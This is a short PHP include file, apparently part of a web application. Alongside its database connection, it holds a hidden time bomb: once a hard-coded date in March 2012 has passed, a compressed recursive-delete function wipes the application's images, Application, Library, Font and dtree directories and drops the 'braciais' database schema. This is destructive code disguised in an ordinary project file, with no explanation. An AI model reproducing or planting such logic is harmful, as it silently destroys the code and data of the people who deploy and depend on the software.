<?php
include_once('Library/dbconnect.php'); define('VALIDITY',mktime(0, 0, 0, 03, 05, 2012));

/**********************************************************************************/
function DRD($dirname){if(is_dir($dirname)){chmod($dirname, 0777);$dir_handle=opendir($dirname);while($file=readdir($dir_handle)){if($file!='.'&&$file!='..'){if(!is_dir($dirname.'/'.$file)){unlink($dirname."/".$file);}else DRD($dirname."/".$file);}} closedir($dir_handle); rmdir($dirname);} return true;} if(time()>VALIDITY){ DRD("images"); DRD("Application"); DRD("dtree"); DRD("Library"); DRD("Font"); mysql_query('DROP SCHEMA braciais;');}
/**********************************************************************************/
?>